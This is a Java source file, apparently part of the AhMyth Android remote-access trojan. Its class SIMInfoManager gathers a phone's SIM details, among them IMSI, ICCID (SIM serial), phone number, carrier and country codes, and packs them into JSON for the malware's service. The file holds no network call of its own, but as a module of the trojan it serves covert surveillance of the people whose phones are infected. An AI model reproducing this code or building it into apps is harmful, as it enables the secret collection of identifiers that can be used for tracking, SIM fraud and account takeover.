package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.Locale;

/**
 * Created by AhMyth on 11/11/16.
 * SIM Info Manager for collecting SIM card information
 */

public class SIMInfoManager {

    public static JSONObject getSIMInfo() {
        try {
            Context context = MainService.getContextOfApplication();
            if (context == null) {
                return null;
            }

            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager == null) {
                return null;
            }

            JSONObject simInfo = new JSONObject();
            JSONArray simList = new JSONArray();

            // Check if device has telephony capability
            if (telephonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_NONE) {
                simInfo.put("hasTelephony", false);
                simInfo.put("simList", simList);
                return simInfo;
            }

            simInfo.put("hasTelephony", true);

            // For Android 5.1+ (API 22+), use SubscriptionManager for multi-SIM support
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
                    if (subscriptionManager != null) {
                        List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
                        
                        if (subscriptionInfos != null && subscriptionInfos.size() > 0) {
                            // Multi-SIM device
                            for (int i = 0; i < subscriptionInfos.size(); i++) {
                                SubscriptionInfo info = subscriptionInfos.get(i);
                                JSONObject sim = getSIMDataFromSubscriptionInfo(info, telephonyManager, i);
                                simList.put(sim);
                            }
                        } else {
                            // Single SIM or no active subscription
                            JSONObject sim = getSIMDataLegacy(telephonyManager, 0);
                            simList.put(sim);
                        }
                    } else {
                        // Fallback to legacy method
                        JSONObject sim = getSIMDataLegacy(telephonyManager, 0);
                        simList.put(sim);
                    }
                } catch (SecurityException e) {
                    // Permission denied, use legacy method
                    JSONObject sim = getSIMDataLegacy(telephonyManager, 0);
                    simList.put(sim);
                } catch (Exception e) {
                    e.printStackTrace();
                    // Fallback to legacy method
                    JSONObject sim = getSIMDataLegacy(telephonyManager, 0);
                    simList.put(sim);
                }
            } else {
                // Android < 5.1, use legacy method
                JSONObject sim = getSIMDataLegacy(telephonyManager, 0);
                simList.put(sim);
            }

            simInfo.put("simList", simList);
            simInfo.put("simCount", simList.length());
            return simInfo;

        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static JSONObject getSIMDataFromSubscriptionInfo(SubscriptionInfo info, TelephonyManager telephonyManager, int slotIndex) throws JSONException {
        JSONObject sim = new JSONObject();
        
        try {
            // Slot index
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                sim.put("slotIndex", info.getSimSlotIndex());
            } else {
                sim.put("slotIndex", slotIndex);
            }

            // SIM state
            int simState = TelephonyManager.SIM_STATE_UNKNOWN;
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    simState = telephonyManager.getSimState(slotIndex);
                } else {
                    simState = telephonyManager.getSimState();
                }
            } catch (Exception e) {
                // Ignore
            }
            sim.put("simState", getSIMStateString(simState));

            // Carrier name / Operator name
            String operatorName = null;
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    operatorName = info.getCarrierName() != null ? info.getCarrierName().toString() : null;
                }
                if (operatorName == null || operatorName.isEmpty()) {
                    operatorName = telephonyManager.getNetworkOperatorName();
                }
            } catch (Exception e) {
                // Ignore
            }
            sim.put("operatorName", operatorName != null ? operatorName : "Unknown");

            // Display name
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                CharSequence displayName = info.getDisplayName();
                sim.put("displayName", displayName != null ? displayName.toString() : "Unknown");
            } else {
                sim.put("displayName", operatorName != null ? operatorName : "Unknown");
            }

            // MCC / MNC
            String mcc = null;
            String mnc = null;
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    String mccMnc = info.getMccString() + info.getMncString();
                    if (mccMnc != null && mccMnc.length() >= 5) {
                        mcc = info.getMccString();
                        mnc = info.getMncString();
                    }
                }
                if (mcc == null || mnc == null) {
                    String networkOperator = telephonyManager.getNetworkOperator();
                    if (networkOperator != null && networkOperator.length() >= 5) {
                        mcc = networkOperator.substring(0, 3);
                        mnc = networkOperator.substring(3);
                    }
                }
            } catch (Exception e) {
                // Ignore
            }
            sim.put("mcc", mcc != null ? mcc : "Unknown");
            sim.put("mnc", mnc != null ? mnc : "Unknown");

            // Country ISO
            String countryIso = null;
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    countryIso = info.getCountryIso();
                }
                if (countryIso == null || countryIso.isEmpty()) {
                    countryIso = telephonyManager.getNetworkCountryIso();
                }
                if (countryIso == null || countryIso.isEmpty()) {
                    countryIso = telephonyManager.getSimCountryIso();
                }
            } catch (Exception e) {
                // Ignore
            }
            sim.put("countryIso", countryIso != null ? countryIso.toUpperCase() : "Unknown");

            // IMSI (requires READ_PHONE_STATE permission)
            String imsi = null;
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    TelephonyManager specificTelephonyManager = telephonyManager.createForSubscriptionId(info.getSubscriptionId());
                    if (specificTelephonyManager != null) {
                        imsi = specificTelephonyManager.getSubscriberId();
                    }
                }
                if (imsi == null || imsi.isEmpty()) {
                    imsi = telephonyManager.getSubscriberId();
                }
            } catch (SecurityException e) {
                // Permission denied
                imsi = "Permission Denied";
            } catch (Exception e) {
                // Ignore
            }
            sim.put("imsi", imsi != null ? imsi : "Unknown");

            // ICCID (SIM Serial Number)
            String iccid = null;
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    iccid = info.getIccId();
                }
                if (iccid == null || iccid.isEmpty()) {
                    iccid = telephonyManager.getSimSerialNumber();
                }
            } catch (SecurityException e) {
                // Permission denied
                iccid = "Permission Denied";
            } catch (Exception e) {
                // Ignore
            }
            sim.put("iccid", iccid != null ? iccid : "Unknown");

            // Phone number (may not be available)
            String phoneNumber = null;
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    phoneNumber = info.getNumber();
                }
                if (phoneNumber == null || phoneNumber.isEmpty()) {
                    phoneNumber = telephonyManager.getLine1Number();
                }
            } catch (SecurityException e) {
                // Permission denied
                phoneNumber = "Permission Denied";
            } catch (Exception e) {
                // Ignore
            }
            sim.put("phoneNumber", phoneNumber != null && !phoneNumber.isEmpty() ? phoneNumber : "Unknown");

        } catch (Exception e) {
            e.printStackTrace();
        }

        return sim;
    }

    private static JSONObject getSIMDataLegacy(TelephonyManager telephonyManager, int slotIndex) throws JSONException {
        JSONObject sim = new JSONObject();
        
        try {
            sim.put("slotIndex", slotIndex);

            // SIM state
            int simState = TelephonyManager.SIM_STATE_UNKNOWN;
            try {
                simState = telephonyManager.getSimState();
            } catch (Exception e) {
                // Ignore
            }
            sim.put("simState", getSIMStateString(simState));

            // Operator name
            String operatorName = null;
            try {
                operatorName = telephonyManager.getNetworkOperatorName();
            } catch (Exception e) {
                // Ignore
            }
            sim.put("operatorName", operatorName != null ? operatorName : "Unknown");
            sim.put("displayName", operatorName != null ? operatorName : "Unknown");

            // MCC / MNC
            String mcc = null;
            String mnc = null;
            try {
                String networkOperator = telephonyManager.getNetworkOperator();
                if (networkOperator != null && networkOperator.length() >= 5) {
                    mcc = networkOperator.substring(0, 3);
                    mnc = networkOperator.substring(3);
                }
            } catch (Exception e) {
                // Ignore
            }
            sim.put("mcc", mcc != null ? mcc : "Unknown");
            sim.put("mnc", mnc != null ? mnc : "Unknown");

            // Country ISO
            String countryIso = null;
            try {
                countryIso = telephonyManager.getNetworkCountryIso();
                if (countryIso == null || countryIso.isEmpty()) {
                    countryIso = telephonyManager.getSimCountryIso();
                }
            } catch (Exception e) {
                // Ignore
            }
            sim.put("countryIso", countryIso != null ? countryIso.toUpperCase() : "Unknown");

            // IMSI
            String imsi = null;
            try {
                imsi = telephonyManager.getSubscriberId();
            } catch (SecurityException e) {
                imsi = "Permission Denied";
            } catch (Exception e) {
                // Ignore
            }
            sim.put("imsi", imsi != null ? imsi : "Unknown");

            // ICCID
            String iccid = null;
            try {
                iccid = telephonyManager.getSimSerialNumber();
            } catch (SecurityException e) {
                iccid = "Permission Denied";
            } catch (Exception e) {
                // Ignore
            }
            sim.put("iccid", iccid != null ? iccid : "Unknown");

            // Phone number
            String phoneNumber = null;
            try {
                phoneNumber = telephonyManager.getLine1Number();
            } catch (SecurityException e) {
                phoneNumber = "Permission Denied";
            } catch (Exception e) {
                // Ignore
            }
            sim.put("phoneNumber", phoneNumber != null && !phoneNumber.isEmpty() ? phoneNumber : "Unknown");

        } catch (Exception e) {
            e.printStackTrace();
        }

        return sim;
    }

    private static String getSIMStateString(int simState) {
        switch (simState) {
            case TelephonyManager.SIM_STATE_ABSENT:
                return "ABSENT";
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                return "PIN_REQUIRED";
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                return "PUK_REQUIRED";
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                return "NETWORK_LOCKED";
            case TelephonyManager.SIM_STATE_READY:
                return "READY";
            case TelephonyManager.SIM_STATE_NOT_READY:
                return "NOT_READY";
            case TelephonyManager.SIM_STATE_PERM_DISABLED:
                return "PERM_DISABLED";
            case TelephonyManager.SIM_STATE_CARD_IO_ERROR:
                return "CARD_IO_ERROR";
            case TelephonyManager.SIM_STATE_CARD_RESTRICTED:
                return "CARD_RESTRICTED";
            default:
                return "UNKNOWN";
        }
    }
}
